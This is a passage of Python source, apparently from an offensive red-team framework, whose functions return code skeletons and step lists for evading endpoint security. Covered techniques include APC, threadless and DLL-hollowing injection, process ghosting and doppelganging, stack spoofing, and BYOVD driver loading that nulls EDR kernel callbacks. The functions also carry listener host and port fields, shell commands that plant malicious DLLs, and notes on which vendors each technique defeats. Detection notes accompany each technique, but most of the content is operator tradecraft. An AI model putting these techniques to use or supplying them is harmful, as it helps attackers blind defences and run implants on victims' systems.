    )


def _apc_injection(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    src = (
        "// Classic APC injection via NtQueueApcThread. Operator embeds in implant.\n"
        "//\n"
        "// 1. OpenProcess(target_pid, PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION)\n"
        "// 2. VirtualAllocEx, WriteProcessMemory for shellcode.\n"
        "// 3. Iterate threads in target, OpenThread(THREAD_SET_CONTEXT|THREAD_GET_CONTEXT|THREAD_SUSPEND_RESUME)\n"
        "// 4. NtQueueApcThread(hThread, &shellcode, NULL, NULL, NULL)\n"
        "// 5. For non-alertable threads: NtAlertResumeThread to coerce into alertable state.\n"
        "//\n"
        "// Listener: " + f"{lhost}:{lport}\n"
        "//\n"
        "// detections:\n"
        "//   - Sysmon Event 8 — APC queue to remote thread\n"
        "//   - WriteProcessMemory followed by NtQueueApcThread (classic pair)\n"
        "//   - EDR userland hook on NtQueueApcThread\n"
    )
    return EvasionResult(
        command=src,
        technique="apc_injection",
        notes=(
            f"APC injection template. Cross-process code execution that doesn't "
            f"create a new thread (uses existing target thread). Listener: "
            f"{lhost}:{lport}. EDRs hook NtQueueApcThread — chain with direct_syscalls."
        ),
        techniques=["T1055.004"],
        risk="HIGH",
        detections=[
            "Sysmon Event 8 (CreateRemoteThread / RemoteAPC)",
            "NtQueueApcThread from non-debugger context",
            "EDR rule on WriteProcessMemory + NtQueueApcThread sequence",
        ],
    )


def _early_bird_apc(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    src = (
        "// Early Bird APC injection — queue the APC BEFORE the target's main thread\n"
        "// runs. Shellcode executes during ntdll initialization, before any user-mode\n"
        "// EDR hook is in place.\n"
        "//\n"
        "// 1. CreateProcess(target.exe, CREATE_SUSPENDED) — fresh process, no threads alive yet.\n"
        "// 2. VirtualAllocEx + WriteProcessMemory in the suspended process.\n"
        "// 3. NtQueueApcThread on the suspended main thread.\n"
        "// 4. ResumeThread — main thread wakes up, ntdll initializes,\n"
        "//    APC fires before any user-mode code runs.\n"
        "//\n"
        "// Pair with shellcode from /generate?language=csharp&lhost=" + lhost + f"&lport={lport}\n"
        "//\n"
        "// detections:\n"
        "//   - CreateProcess(SUSPENDED) followed by VirtualAllocEx (Sysmon)\n"
        "//   - APC queued to thread before it has run\n"
        "//   - Thread start address inside non-image RX region\n"
    )
    return EvasionResult(
        command=src,
        technique="early_bird_apc",
        notes=(
            f"Early Bird APC. Bypasses userland EDR hooks because the APC executes "
            f"during ntdll initialization — before the hook DLL is loaded. Listener: "
            f"{lhost}:{lport}. One of the most effective injection patterns of 2024-25."
        ),
        techniques=["T1055.004"],
        risk="CRITICAL",
        detections=[
            "Suspicious CreateProcess(SUSPENDED) followed by WriteProcessMemory",
            "Kernel ETW Threat-Intel: APC queued to suspended thread",
            "EDR rule 'NtQueueApcThread to thread that has never run'",
        ],
    )


def _heaven_gate(payload: str, obfuscate: bool) -> EvasionResult:
    src = (
        "// Heaven's Gate — pivot from a 32-bit (WoW64) process to 64-bit native\n"
        "// execution. Some EDRs only hook the 64-bit NTDLL; 32-bit processes that\n"
        "// reach their 64-bit twin bypass user-mode telemetry entirely.\n"
        "//\n"
        "// Mechanism: WoW64 processes have BOTH ntdll.dll (64-bit) and wow64.dll\n"
        "// loaded. The 64-bit ntdll is reachable via segment-selector 0x33 (long mode)\n"
        "// while the 32-bit binary normally runs in 0x23 (compat mode).\n"
        "//\n"
        "// FAR JMP 0x33:offset transitions to 64-bit. Issue the syscall there with\n"
        "// the proper x64 register convention. Return via FAR JMP 0x23:offset.\n"
        "//\n"
        "// Skeleton (inline assembly required — operator writes in Nim or MASM):\n"
        "//\n"
        "//   ; 32-bit code\n"
        "//   push 0x33                  ; long mode selector\n"
        "//   call $+5\n"
        "//   add dword [esp], 5         ; return address into 64-bit code\n"
        "//   retf                       ; far return → 64-bit execution\n"
        "//   ; 64-bit code follows; issue x64 NTAPI directly here\n"
        "//\n"
        "// References: blog.rewolf.pl, github.com/khoaSec/heavens-gate-pls.\n"
        "//\n"
        "// detections:\n"
        "//   - WoW64 process issuing x64 syscalls (rare; Threat-Intel ETW)\n"
        "//   - FAR JMP with selector 0x33 in a 32-bit binary (memory-scanner signature)\n"
        "//   - Mismatch between 32-bit hook installation and 64-bit observed calls\n"
    )
    return EvasionResult(
        command=src,
        technique="heaven_gate",
        notes=(
            "Heaven's Gate — 32-bit-to-64-bit syscall pivot. Bypasses EDRs that only "
            "hook 64-bit NTDLL and assume WoW64 processes can't reach native syscalls. "
            "Requires inline asm — operator writes in Nim/MASM, not Python."
        ),
        techniques=["T1106"],
        risk="CRITICAL",
        detections=[
            "WoW64 process performing 64-bit syscalls (Threat-Intel ETW)",
            "Segment-selector 0x33 in 32-bit binary (memory pattern scan)",
            "EDR sensor mismatch — 32-bit hooks see no calls, 64-bit kernel telemetry sees activity",
        ],
    )


def _process_ghosting(payload: str, obfuscate: bool) -> EvasionResult:
    src = (
        "// Process Ghosting — file is deleted BEFORE the section is mapped, so the\n"
        "// resulting process has no on-disk backing image. Defender's image-integrity\n"
        "// scan can't fetch the bytes to compare. Disclosed by Elastic in 2021;\n"
        "// still effective against many vendors as of 2025.\n"
        "//\n"
        "// 1. NtCreateFile with FILE_DISPOSITION_DELETE — opens a file already marked for delete.\n"
        "// 2. NtWriteFile shellcode.\n"
        "// 3. NtCreateSection(SEC_IMAGE) on the deletion-pending file.\n"
        "// 4. Close the file handle — file is gone, but the section persists.\n"
        "// 5. NtCreateProcessEx using the section.\n"
        "// 6. NtCreateThreadEx in the new process.\n"
        "//\n"
        "// References: https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack\n"
        "//\n"
        "// detections:\n"
        "//   - Process with no FileName / Image path (anomalous)\n"
        "//   - NtCreateProcessEx from a section whose backing file is deleted\n"
        "//   - PsSetCreateProcessNotifyRoutineEx kernel callback sees no image path\n"
    )
    return EvasionResult(
        command=src,
        technique="process_ghosting",
        notes=(
            "Process Ghosting. Spawns a process whose backing file no longer exists. "
            "Defender's pre-execution image-hash check can't run. Modern Defender "
            "for Endpoint flags processes with NULL image paths — chain with PPID "
            "spoof to misattribute the parent."
        ),
        techniques=["T1055.012", "T1070.004"],
        risk="CRITICAL",
        detections=[
            "Sysmon Event 1 with empty/anomalous Image path",
            "Kernel callback PsSetCreateProcessNotifyRoutineEx with no image data",
            "EDR rule 'process created from deletion-pending file'",
        ],
    )


def _process_doppelganging(payload: str, obfuscate: bool) -> EvasionResult:
    src = (
        "// Process Doppelganging — uses NTFS Transactional API (TxF). Create a\n"
        "// transaction, write the malicious payload to a legitimate filename WITHIN\n"
        "// the transaction, map it as a section, then ROLL BACK the transaction.\n"
        "// On-disk the file is unchanged; the section retains the rolled-back bytes.\n"
        "// Process created from that section runs the malicious code while the\n"
        "// on-disk file still looks clean.\n"
        "//\n"
        "// 1. CreateTransaction\n"
        "// 2. CreateFileTransacted(legit.exe, GENERIC_WRITE, ...)\n"
        "// 3. WriteFile(shellcode_pe_bytes)\n"
        "// 4. NtCreateSection(SEC_IMAGE) on the transacted file\n"
        "// 5. RollbackTransaction — on-disk file is reverted\n"
        "// 6. NtCreateProcessEx using the section\n"
        "// 7. NtCreateThreadEx\n"
        "//\n"
        "// Disclosed by enSilo at Black Hat EU 2017. TxF is deprecated but still\n"
        "// works on Win10/11 for backward compatibility. PsSetCreateProcessNotify\n"
        "// callbacks see the new process pointing at the original (clean) filename.\n"
        "//\n"
        "// detections:\n"
        "//   - Transactions enumerated by EDR (rare in legitimate workloads)\n"
        "//   - File memory section that doesn't match on-disk hash\n"
        "//   - EDR memory integrity scan of process .text vs file\n"
    )
    return EvasionResult(
        command=src,
        technique="process_doppelganging",
        notes=(
            "Process Doppelganging — TxF-based hollowing. On-disk file looks clean "
            "to AV scanners; in-memory image is the payload. TxF is deprecated by "
            "Microsoft but still functions on current Windows. Pair with PPID spoof."
        ),
        techniques=["T1055.013"],
        risk="CRITICAL",
        detections=[
            "Transactional NTFS operations from non-system process",
            "NtCreateSection on a transacted file followed by RollbackTransaction",
            "EDR memory-integrity scan: image .text content drift from disk hash",
        ],
    )


def _process_herpaderping(payload: str, obfuscate: bool) -> EvasionResult:
    src = (
        "// Process Herpaderping — write malicious PE → map it → MODIFY the file →\n"
        "// CreateProcess. Many AV scan the file at NtCreateSection time; by the time\n"
        "// the kernel reads the file for the PsSet callback, the bytes are different.\n"
        "// Result: callback fires with the post-modification bytes (looks clean),\n"
        "// while the section retains the pre-modification (malicious) bytes.\n"
        "//\n"
        "// 1. CreateFile(legit_name.exe, GENERIC_WRITE|GENERIC_READ).\n"
        "// 2. WriteFile(malicious_pe).\n"
        "// 3. NtCreateSection(SEC_IMAGE) — section now contains malicious bytes.\n"
        "// 4. SetFilePointer + WriteFile(legit_pe) — overwrite on-disk with clean PE.\n"
        "// 5. NtCreateProcessEx using the section.\n"
        "// 6. NtCreateThreadEx.\n"
        "// 7. (Optionally) delete or restore the file.\n"
        "//\n"
        "// Disclosed by jxy-s on GitHub (2020). Microsoft initially marked WONTFIX,\n"
        "// then quietly patched the EDR side in WDAC + DefenderXDR. Still works\n"
        "// against signature-based AV.\n"
        "//\n"
        "// detections:\n"
        "//   - Image memory section content drift from on-disk hash\n"
        "//   - Memory-integrity scan during pre-thread phase\n"
        "//   - EDR rule on NtCreateSection followed by WriteFile to same handle\n"
    )
    return EvasionResult(
        command=src,
        technique="process_herpaderping",
        notes=(
            "Process Herpaderping. Section captures malicious bytes; on-disk file "
            "is overwritten with a benign PE before process callbacks fire. Defeats "
            "signature-based AV. Modern XDR (DefenderXDR + CrowdStrike) memory "
            "integrity scans flag the drift."
        ),
        techniques=["T1055.012", "T1027"],
        risk="CRITICAL",
        detections=[
            "EDR memory-integrity: image .text drift from on-disk hash at thread start",
            "Sysmon Event 11 (FileCreate) overlapping with Event 1 (process create)",
            "WriteFile to a handle just after NtCreateSection on it",
        ],
    )


# ── Frontier tradecraft (v4.4) ────────────────────────────────────────────────

def _peb_unlink(payload: str, obfuscate: bool) -> EvasionResult:
    src = (
        "// PEB unlinking — remove a loaded module from the three linked lists\n"
        "// the loader walks: InLoadOrderModuleList, InMemoryOrderModuleList,\n"
        "// InInitializationOrderModuleList. After unlinking, GetModuleHandle and\n"
        "// EnumProcessModules return success+no-data for the target DLL.\n"
        "//\n"
        "// Many EDR memory scanners iterate PEB->Ldr to enumerate loaded modules.\n"
        "// Unlinking your beacon DLL hides it from those scanners while it stays\n"
        "// fully mapped and executable in memory.\n"
        "//\n"
        "// C skeleton (x64):\n"
        "//   PEB* peb = (PEB*) __readgsqword(0x60);\n"
        "//   PEB_LDR_DATA* ldr = peb->Ldr;\n"
        "//   for (LIST_ENTRY* e = ldr->InMemoryOrderModuleList.Flink;\n"
        "//        e != &ldr->InMemoryOrderModuleList; e = e->Flink) {\n"
        "//     LDR_DATA_TABLE_ENTRY* m = CONTAINING_RECORD(e, ..., InMemoryOrderLinks);\n"
        "//     if (wcsicmp(m->BaseDllName.Buffer, L\"beacon.dll\") == 0) {\n"
        "//       m->InLoadOrderLinks.Blink->Flink = m->InLoadOrderLinks.Flink;\n"
        "//       m->InLoadOrderLinks.Flink->Blink = m->InLoadOrderLinks.Blink;\n"
        "//       // repeat for InMemoryOrderLinks, InInitializationOrderLinks, HashLinks\n"
        "//       break;\n"
        "//     }\n"
        "//   }\n"
        "//\n"
        "// detections:\n"
        "//   - Memory enumeration via VirtualQuery walking image regions (bypasses PEB)\n"
        "//   - PsSetLoadImageNotifyRoutine kernel callback fires on load — unlink is post-load\n"
        "//   - Sysmon Event 7 captures the original load before unlink; module diff per process\n"
    )
    return EvasionResult(
        command=src,
        technique="peb_unlink",
        notes=(
            "PEB unlinking. Hides loaded modules from PEB->Ldr enumeration. "
            "Effective against EDR memory scanners that iterate the loader lists. "
            "Doesn't hide from kernel callbacks or VirtualQuery-based scans."
        ),
        techniques=["T1027", "T1564"],
        risk="HIGH",
        detections=[
            "Memory scan: image region without corresponding PEB->Ldr entry",
            "Kernel callback ETW: image load event with no user-mode trace afterward",
            "EDR rule on writes to PEB_LDR_DATA list pointers",
        ],
    )


def _phantom_dll_hollow(payload: str, obfuscate: bool) -> EvasionResult:
    src = (
        "// Phantom DLL hollowing — map a legitimate signed DLL as image, then\n"
        "// overwrite its .text section with shellcode. The mapped memory still\n"
        "// reports an image-backed source (the signed DLL file), so EDR memory\n"
        "// scanners that check 'is this region backed by a signed file?' return YES.\n"
        "//\n"
        "// Distinct from module_stomping: phantom DLL hollow uses a DLL NOT loaded\n"
        "// by the process — we map it fresh via NtCreateSection from a file handle.\n"
        "// No LdrLoadDll, no DLL_PROCESS_ATTACH artifact.\n"
        "//\n"
        "// Skeleton:\n"
        "//   HANDLE h = CreateFile(L\"C:\\\\Windows\\\\System32\\\\version.dll\", GENERIC_READ, ...);\n"
        "//   HANDLE section; NtCreateSection(&section, SECTION_ALL_ACCESS, NULL,\n"
        "//                                    NULL, PAGE_EXECUTE_READ, SEC_IMAGE, h);\n"
        "//   PVOID base; SIZE_T size = 0;\n"
        "//   NtMapViewOfSection(section, NtCurrentProcess, &base, ...);\n"
        "//   // base now contains a fresh image-mapped version.dll\n"
        "//   VirtualProtect(text_section, size, PAGE_EXECUTE_READWRITE, &old);\n"
        "//   memcpy(text_section, shellcode, shellcode_len);\n"
        "//   VirtualProtect(text_section, size, PAGE_EXECUTE_READ, &old);\n"
        "//   CreateThread(NULL, 0, text_section, NULL, 0, NULL);\n"
        "//\n"
        "// References: forrest-orr / phantom-dll-hollower-poc\n"
        "//\n"
        "// detections:\n"
        "//   - Image .text content drift from file hash (memory integrity)\n"
        "//   - DLL mapped via NtCreateSection but never linked into PEB->Ldr\n"
        "//   - Thread start address inside image .text at non-export offset\n"
    )
    return EvasionResult(
        command=src,
        technique="phantom_dll_hollow",
        notes=(
            "Phantom DLL hollowing — map a fresh image from disk, overwrite its "
            ".text. Memory region reports as image-backed by a signed file. EDR "
            "checks for 'thread starts in signed image' return TRUE while the "
            "code is your payload. Defeats most non-XDR vendors."
        ),
        techniques=["T1055.001", "T1027"],
        risk="CRITICAL",
        detections=[
            "Image region with file backing whose .text hash doesn't match disk",
            "Section mapped from a DLL that never gets a PEB->Ldr entry",
            "Thread start at image .text non-export offset",
        ],
    )


def _threadless_injection(payload: str, obfuscate: bool, lhost: str, lport: int) -> EvasionResult:
    src = (
        "// Threadless injection — no CreateRemoteThread, no NtCreateThreadEx,\n"
        "// no QueueUserAPC. Instead, hook a function pointer inside an already-\n"
        "// running thread of the target. When the target thread next dispatches\n"
        "// through that pointer, your code runs.\n"
        "//\n"
        "// Classic targets:\n"
        "//   - DLL export thunks (write 0xE9 relative jump to your shellcode)\n"
        "//   - GetProcAddress return values (cache poisoning)\n"
        "//   - Vectored Exception Handler (RtlAddVectoredExceptionHandler)\n"
        "//   - Module load callbacks via LdrRegisterDllNotification\n"
        "//\n"
        "// Disclosed by @CCob 'ThreadlessInject' (2023). Defeats every EDR rule\n"
        "// that triggers on cross-process thread creation.\n"
        "//\n"
        "// Skeleton (writes 0xE9 relative jump):\n"
        "//   HANDLE target = OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, ...);\n"
        "//   void* victim = GetRemoteProcAddress(target, L\"kernel32.dll\", \"Sleep\");\n"
        "//   void* sc_addr = VirtualAllocEx(target, NULL, sc_len, MEM_COMMIT, PAGE_READWRITE);\n"
        "//   WriteProcessMemory(target, sc_addr, shellcode, sc_len, NULL);\n"
        "//   uint32_t delta = (uint32_t)((char*)sc_addr - (char*)victim - 5);\n"
        "//   uint8_t jmp[5] = { 0xE9, delta & 0xFF, ... };\n"
        "//   WriteProcessMemory(target, victim, jmp, 5, NULL);\n"
        "//   VirtualProtectEx(target, sc_addr, sc_len, PAGE_EXECUTE_READ, ...);\n"
        "//   // Wait — when target thread next calls Sleep(), it jumps into shellcode.\n"
        "//\n"
        f"// Listener: {lhost}:{lport}\n"
        "//\n"
        "// detections:\n"
        "//   - WriteProcessMemory to .text of a system DLL (Sysmon Event)\n"
        "//   - Image .text drift from disk hash at a known export offset\n"
        "//   - Function pointer modification in shared library memory\n"
    )
    return EvasionResult(
        command=src,
        technique="threadless_injection",
        notes=(
            f"Threadless injection (CCob 2023). Hijacks an existing thread's "
            f"function-pointer dispatch path. No thread create, no APC, no hook. "
            f"Listener: {lhost}:{lport}. Effective against EDR rules anchored on "
            "cross-process thread creation."
        ),
        techniques=["T1055"],
        risk="CRITICAL",
        detections=[
            "WriteProcessMemory targeting .text of a system DLL",
            "Image-integrity scan: .text drift at export thunk offsets",
            "Defender Threat-Intel ETW for inline-hook installation",
        ],
    )


def _stack_spoof(payload: str, obfuscate: bool) -> EvasionResult:
    src = (
        "// Stack spoofing — fake the call stack during sensitive operations so\n"
        "// EDRs that walk the stack on syscall entry see only legitimate frames.\n"
        "//\n"
        "// Two common approaches:\n"
        "//\n"
        "// 1. SilentMoonwalk (klezVirus, 2022): manipulate the synthetic frame\n"
        "//    layout so the unwinder follows our fake frames back to legitimate\n"
        "//    RIPs inside ntdll.dll. EDR sees: ntdll!Nt* <- ntdll!Rtl* <- legit_caller.\n"
        "//\n"
        "// 2. Synthetic stack (Cobalt Strike's spoof_stack profile setting):\n"
        "//    push fabricated return addresses onto a separate VirtualAlloc'd stack,\n"
        "//    swap RSP, issue syscall, swap RSP back. The on-CPU stack during the\n"
        "//    syscall is the fabricated one.\n"
        "//\n"
        "// Skeleton (synthetic stack, x64):\n"
        "//   void* fake_stack = VirtualAlloc(NULL, 0x4000, MEM_COMMIT, PAGE_READWRITE);\n"
        "//   uint64_t* sp = (uint64_t*)((char*)fake_stack + 0x3000);\n"
        "//   *--sp = (uint64_t)KnownGoodRetAddrInNtdll;   // unwinder follows here\n"
        "//   *--sp = (uint64_t)KnownGoodRetAddrInKernel32; // and here\n"
        "//   // ... rest of fabricated chain ...\n"
        "//   __asm { mov [old_rsp], rsp; mov rsp, sp; syscall; mov rsp, [old_rsp]; }\n"
        "//\n"
        "// References: github.com/klezVirus/SilentMoonwalk\n"
        "//\n"
        "// detections:\n"
        "//   - Stack walker landing on RIPs that don't match the calling function\n"
        "//   - Kernel ETW: syscall with RSP outside the thread's true stack range\n"
        "//   - EDR rule on RSP modification within user-mode (rare in legit code)\n"
    )
    return EvasionResult(
        command=src,
        technique="stack_spoof",
        notes=(
            "Stack spoofing. Fabricate clean call frames before sensitive syscalls. "
            "Bypasses callstack-walking EDRs (CrowdStrike Falcon's biggest detection "
            "primitive). SilentMoonwalk is the canonical impl; CS 4.7+ has it as "
            "a built-in profile option."
        ),
        techniques=["T1027", "T1620"],
        risk="CRITICAL",
        detections=[
            "Kernel ETW: syscall with thread RSP outside committed stack range",
            "Stack walker: return address inside a function but not at a CALL boundary",
            "EDR rule on user-mode RSP swap (XCHG/MOV to RSP)",
        ],
    )


def _manual_map_header_erase(payload: str, obfuscate: bool) -> EvasionResult:
    src = (
        "// Manual mapping with header erasure. The standard reflective-loader\n"
        "// flow leaves the PE headers intact in memory — IMAGE_DOS_HEADER 'MZ'\n"
        "// magic + IMAGE_NT_HEADERS at offset e_lfanew. Memory scanners trigger\n"
        "// on these signatures.\n"
        "//\n"
        "// After mapping the PE manually:\n"
        "// 1. Note the entry point address (base + AddressOfEntryPoint).\n"
        "// 2. Zero or randomize the first sizeOfHeaders bytes.\n"
        "// 3. VirtualProtect the header region back to PAGE_NOACCESS (or just\n"
        "//    free it and rely on the section copies).\n"
        "//\n"
        "// Memory scanners now see a region without PE magic — the image hides\n"
        "// from string-search scans entirely. Code still executes because the\n"
        "// entry point address is in the .text section, not the headers.\n"
        "//\n"
        "// Skeleton:\n"
        "//   // ... reflective load completes ...\n"
        "//   DWORD old; VirtualProtect(base, sizeOfHeaders, PAGE_READWRITE, &old);\n"
        "//   memset(base, 0, sizeOfHeaders);\n"
        "//   VirtualProtect(base, sizeOfHeaders, PAGE_NOACCESS, &old);\n"
        "//   ((entry_t)(base + AddressOfEntryPoint))(NULL);\n"
        "//\n"
        "// detections:\n"
        "//   - Memory region with executable .text but no PE header (anomalous)\n"
        "//   - EDR memory scanner: region scoring high on .text characteristics\n"
        "//     but missing IMAGE_DOS/IMAGE_NT magic\n"
        "//   - Kernel ETW: PsGetProcessImageFileName returns NULL for thread's image\n"
    )
    return EvasionResult(
        command=src,
        technique="manual_map_header_erase",
        notes=(
            "Manual mapping + PE header erasure. Hides reflectively-loaded PE "
            "from string-search scans (no MZ magic). Defeats simple memory-scanner "
            "signatures; modern XDR (Defender for Endpoint, S1) also score on "
            ".text characteristics and may still flag."
        ),
        techniques=["T1027", "T1620"],
        risk="CRITICAL",
        detections=[
            "Memory region with executable code but no PE header magic",
            "Thread start address in unbacked RX region",
            "EDR heuristic scanner: high entropy + .text-like region without image backing",
        ],
    )


def _function_level_encryption(payload: str, obfuscate: bool) -> EvasionResult:
    src = (
        "// Function-level encryption. Each function in the beacon is encrypted at\n"
        "// rest with its own key; on call, a stub decrypts the function, executes\n"
        "// it, then re-encrypts. Memory scanners that snapshot the process see\n"
        "// almost the entire .text as ciphertext.\n"
        "//\n"
        "// Build-time:\n"
        "// 1. Compile with each sensitive function in its own COMDAT section.\n"
        "// 2. Post-link, encrypt each section in place using a per-function key.\n"
        "// 3. Insert prologue/epilogue stubs that decrypt → execute → re-encrypt.\n"
        "//\n"
        "// Runtime (per function call):\n"
        "//   stub_decrypt(func_section_addr, len, key); // RC4 / ChaCha20\n"
        "//   real_func();                                // run\n"
        "//   stub_encrypt(func_section_addr, len, key); // restore ciphertext\n"
        "//\n"
        "// References:\n"
        "//   - github.com/janoglezcompanioni/Function-Level-Encryption-with-Foliage\n"
        "//   - Nighthawk's 'function encryption' option (C2-Tools)\n"
        "//\n"
        "// detections:\n"
        "//   - Frequent VirtualProtect on .text page granularity\n"
        "//   - .text pages flapping between PAGE_READWRITE and PAGE_EXECUTE_READ\n"
        "//   - Page-level entropy variance over time (advanced memory scanner)\n"
    )
    return EvasionResult(
        command=src,
        technique="function_level_encryption",
        notes=(
            "Function-level encryption. Only the currently-running function is "
            "ever decrypted in memory. Defeats most memory scanners; modern XDR "
            "with page-flap detection (Defender for Endpoint 2024+) may flag the "
            "frequent VirtualProtect toggles."
        ),
        techniques=["T1027", "T1620"],
        risk="CRITICAL",
        detections=[
            "VirtualProtect flap on the same .text page within short window",
            "Page-level entropy variance suggesting in-place decrypt/re-encrypt",
            "Defender ASR 'Block executable content from email/web' on extracted plaintext",
        ],
    )


# ── v4.5 tradecraft ───────────────────────────────────────────────────────────

def _call_stack_desync(payload: str, obfuscate: bool) -> EvasionResult:
    src = (
        "// Call-stack desynchronisation — combine indirect syscalls with deliberate\n"
        "// CFG-invalid return addresses so the EDR's stack walker gets a corrupted view.\n"
        "//\n"
        "// Mechanism:\n"
        "// 1. Before calling NtAllocateVirtualMemory (or any sensitive Nt*), push a\n"
        "//    fabricated RIP onto the stack that points into the MIDDLE of a known-good\n"
        "//    function (e.g., ntdll!RtlUserFiber+0x42). This frame is CFG-invalid but\n"
        "//    appears legitimate to a naive frame-walk that just follows return addresses.\n"
        "// 2. Execute the syscall via an indirect gadget (syscall;ret inside ntdll).\n"
        "// 3. On return, pop the fabricated frame before continuing.\n"
        "//\n"
        "// Combined effect:\n"
        "//   - The callstack during the syscall shows a CFG-inconsistent but\n"
        "//     plausible-looking chain.\n"
        "//   - EDR stack walkers following RIPs may land in unexpected functions and\n"
        "//     misclassify the call origin.\n"
        "//   - Combine with sleep-masking to prevent out-of-syscall memory scans.\n"
        "//\n"
        "// Skeleton (x64 asm):\n"
        "//   push  <mid_function_gadget>   ; fabricated frame 1\n"
        "//   push  <legit_ntdll_retaddr>   ; fabricated frame 2 (CFG-valid)\n"
        "//   sub   rsp, 0x28               ; shadow space\n"
        "//   mov   r10, rcx               ; NtAllocateVirtualMemory ABI\n"
        "//   mov   eax, <ssn>              ; SSN resolved at runtime (SysWhispers3)\n"
        "//   jmp   <syscall_gadget>        ; indirect: ntdll gadget issues syscall\n"
        "//   ; --- on return: add rsp, 0x28 + pop 2 fabricated frames\n"
        "//\n"
        "// References: KlezVirus/SilentMoonwalk, Cobalt Strike 4.7 'cs-stack-spoof'\n"
    )
    return EvasionResult(
        command=src,
        technique="call_stack_desync",
        notes=(
            "Combines indirect syscalls with CFG-inconsistent fabricated frames. "
            "The kernel-side callstack during the syscall looks legitimate to "
            "basic stack walkers; CFG-aware EDRs may still flag the invalid "
            "branch target. Most effective against CrowdStrike Falcon and "
            "Defender for Endpoint callstack-inspection primitives."
        ),
        techniques=["T1106", "T1027", "T1620"],
        risk="CRITICAL",
        detections=[
            "Syscall with return address chain containing mid-function offsets",
            "CFG bitmap mismatch on indirect branch targets in user-mode",
            "Kernel ETW: thread executing syscall with RSP in non-stack-committed region",
            "EDR callstack heuristic: ntdll frame followed by non-ntdll frame at depth 1",
        ],
    )


def _byovd(payload: str, obfuscate: bool) -> EvasionResult:
    src = (
        "// BYOVD — Bring Your Own Vulnerable Driver\n"
        "//\n"
        "// Phase 1: Load\n"
        "//   Drop a known-vulnerable WHQL-signed driver to disk (e.g., RTCore64.sys,\n"
        "//   dbutil_2_3.sys). Load it via:\n"
        "//     sc create vuln_drv binPath=C:\\Windows\\Temp\\rtcore64.sys type=kernel\n"
        "//     sc start vuln_drv\n"
        "//   On systems with Vulnerable Driver Blocklist, pick a driver not yet\n"
        "//   on the list (check: https://learn.microsoft.com/en-us/windows/security/\n"
        "//   threat-protection/windows-defender-application-control/microsoft-recommended-driver-block-rules)\n"
        "//\n"
        "// Phase 2: Exploit (RTCore64 IOCTL example)\n"
        "//   RTCore64 exposes IOCTL 0x70002025 (arbitrary kernel read) and\n"
        "//                     0x70002029 (arbitrary kernel write).\n"
        "//   hDev = CreateFile(\"\\\\.\\RTCore64\", GENERIC_READ|GENERIC_WRITE, ...)\n"
        "//   Craft DeviceIoControl payload to walk PsLoadedModuleList,\n"
        "//   locate target EDR kernel driver KernelBase, zero its callbacks.\n"
        "//\n"
        "// Phase 3: Disable EDR kernel callbacks\n"
        "//   Targets: PsSetCreateProcessNotifyRoutine, PsSetLoadImageNotifyRoutine,\n"
        "//            ObRegisterCallbacks (handle duplication interception)\n"
        "//   Null out or NOP the registered EDR callback pointers directly in the\n"
        "//   kernel callback array. EDR is blinded for new process/image events.\n"
        "//\n"
        "// Phase 4: Cleanup\n"
        "//   sc stop vuln_drv && sc delete vuln_drv && del RTCore64.sys\n"
        "//\n"
        "// Tools: PPLKiller, KDMapper, EDRSandBlast, Backstab\n"
        "//\n"
        "// Notes: Requires local Administrator. Most EDRs load their kernel components\n"
        "//        as PPL (Protected Process Light) — BYOVD can bypass PPL protection.\n"
        "//        HVCI (Core Isolation) blocks loading unsigned or blocklisted drivers.\n"
    )
    return EvasionResult(
        command=src,
        technique="byovd",
        notes=(
            "Bring Your Own Vulnerable Driver. Loads a WHQL-signed but exploitable "
            "kernel driver to gain ring-0 code execution and null-out EDR kernel "
            "callbacks. Requires Administrator. HVCI (Core Isolation) blocks this "
            "on modern Secured-Core PCs. Check the MS driver blocklist before "
            "staging a specific driver."
        ),
        techniques=["T1068 - Exploitation for Privilege Escalation",
                    "T1562.001 - Impair Defenses: Disable or Modify Tools",
                    "T1014 - Rootkit"],
        risk="CRITICAL",
        detections=[
            "sc.exe or NtLoadDriver loading a non-inbox driver binary",
            "Sysmon Event 6 (driver loaded) with a non-Microsoft-signed driver",
            "Windows Defender driver blocklist alert (Event 3067/3077)",
            "Kernel callback array pointer zeroed (memory integrity check)",
            "HVCI policy violation: unsigned driver load attempt",
        ],
    )


def _dll_redirection(payload: str, obfuscate: bool) -> EvasionResult:
    src = (
        "// DLL Redirection via .local file and SxS manifest abuse\n"
        "//\n"
        "// Method A — .local redirection (legacy, XP+):\n"
        "//   Create an empty file named <app>.exe.local beside the target EXE.\n"
        "//   Windows loader now searches the application directory FIRST for any DLL\n"
        "//   the EXE imports, before System32. Drop your malicious version.dll there.\n"
        "//\n"
        "//   cmd> copy NUL C:\\ProgramData\\SomeVendor\\app.exe.local\n"
        "//   cmd> copy C:\\tools\\version_mal.dll C:\\ProgramData\\SomeVendor\\version.dll\n"
        "//   cmd> C:\\ProgramData\\SomeVendor\\app.exe\n"
        "//\n"
        "//   Limitation: blocked when DevOverrideEnable=0 (default on Server 2016+).\n"
        "//\n"
        "// Method B — SxS (Side-by-Side) manifest redirect:\n"
        "//   Craft an application manifest embedding a <dependency> for a known DLL:\n"
        "//     <assemblyIdentity name='Microsoft.Windows.Common-Controls'\n"
        "//       version='6.0.0.0' processorArchitecture='*' publicKeyToken='...' />\n"
        "//   Place your malicious comctl32.dll in a folder alongside the EXE, named\n"
        "//   per the assembly identity path. The Win32 SxS loader resolves your DLL.\n"
        "//\n"
        "// Method C — KnownDlls exclusion trick:\n"
        "//   KnownDlls (e.g., ntdll.dll, kernel32.dll) are mapped from the kernel\n"
        "//   object namespace and cannot be redirected. However, DLLs NOT in\n"
        "//   KnownDlls (e.g., wbemdisp.dll, sfc.dll) can be dropped in the app dir.\n"
        "//\n"
        "// Execution:\n"
        "//   The malicious DLL should proxy all legitimate exports to the real DLL\n"
        "//   (same as DLL sideloading) and run your payload in DllMain.\n"
    )
    return EvasionResult(
        command=src,
        technique="dll_redirection",
        notes=(
            ".local redirection and SxS manifest abuse hijack the DLL search order "
            "without touching System32 or PATH. The target executable is untouched "
            "and retains its signature. Best on pre-2019 Windows or where "
            "DevOverrideEnable is set. Combine with DLL proxying to avoid crashes. "
            "SxS method is stealthier and works on modern Windows."
        ),
